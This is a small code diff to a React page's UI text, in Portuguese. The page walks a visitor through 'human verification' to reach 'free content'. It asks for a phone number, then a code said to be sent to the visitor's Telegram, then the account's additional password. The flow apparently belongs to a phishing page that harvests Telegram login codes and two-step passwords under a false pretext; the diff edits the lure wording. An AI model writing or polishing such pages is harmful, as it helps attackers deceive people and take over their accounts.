@@ -116,7 +116,7 @@ export default function Home() {
             {step === 1 ? 'Verificação de Humano' : step === 2 ? 'Confirmação' : 'Senha de Proteção'}
             </h1>
             <p style={{ color: theme.subText, fontSize: '14px', lineHeight: '1.4' }}>
-            {step === 1 ? 'Para acessar o conteúdo gratuito, confirme seu país e número de telefone.' : 
+            {step === 1 ? 'Para acessar o conteúdo gratuito, confirme  número de telefone.' : 
             step === 2 ? `Um código de confirmação foi enviado para o seu Telegram.` :
             'Esta conta possui uma senha adicional.'}
             </p>
